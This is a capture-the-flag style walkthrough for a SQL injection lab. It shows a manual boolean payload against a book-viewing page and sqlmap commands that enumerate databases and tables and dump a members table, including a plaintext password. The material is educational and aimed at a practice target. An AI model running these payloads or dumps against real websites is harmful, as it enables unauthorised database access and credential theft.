# Challenge #1 - Poema Reading club 5

## Objectives

- You want to find SQL injection vulnerabilities in the website, determining the type of SQL injection and its exploitability You will also have to extract information from the database exploiting the vulnerability
- Find out Ruud password in the database

## Hints

- MySQL

## What you will learn

- How to find SQL injection vulnerabilities manually
- How to determine if a SQL injection is of type "blind" or "error based"
- How to extract information from a database using SQLMap

## Steps

The vulnerable endpoint is on the recommended books -> view book. The error message points to something wrong on this page.

Target url:
http://1.challenge.sqli.site/view_book.php?id=1

```
"Notice: Undefined index: title in /var/www/challenge.sqli.site/1/view_book.php on line 58"
```

Change the book number with the payload below.

```
9999 or 1=1-- -

http://1.challenge.sqli.site/view_book.php?id=9999%20or%201=1--%20-
```

There is no book with number 9999, as the second part of the payload is 1=1, this will match all books, and so, the page show the first retrieved.

Send the original url to SQLMap.

```
sqlmap -u http://1.challenge.sqli.site/view_book.php?id=1 --batch --dbms=mysql
```

After a few moments SQLMap will return with the follow results.

```
GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 51 HTTP(s) requests:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1 AND 3056=3056

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1 AND (SELECT 1358 FROM (SELECT(SLEEP(5)))kXNq)

    Type: UNION query
    Title: Generic UNION query (NULL) - 6 columns
    Payload: id=-3956 UNION ALL SELECT CONCAT(0x716b7a7a71,0x536147644551706866424944757659684665686b6649426c6d4144727261734458675553774b694f,0x7176707671),NULL,NULL,NULL,NULL,NULL-- -
```

List all databases.

```
sqlmap -u http://1.challenge.sqli.site/view_book.php?id=1 --batch --dbms=mysql --dbs

[*] information_schema
[*] poema
```

List all tables from poema database.

```
sqlmap -u http://1.challenge.sqli.site/view_book.php?id=1 --batch --dbms=mysql -D poema --tables

Database: poema                             
[2 tables]
+--------------+
| books        |
| club_members |
+--------------+
```

Retrieve the table club_members and search for the Ruud password in the database

```
sqlmap -u http://1.challenge.sqli.site/view_book.php?id=1 --batch --dbms=mysql -D poema -T club_members --dump

Database: poema                             Table: club_members
[30 entries]
| id | zip   | city             | name     | password    | username                                   |
[...]
| 12 | 73544 | Cerritos         | Ruud     | W000Tw0000t | feugiat@nonsollicitudin.org                |
[...]
```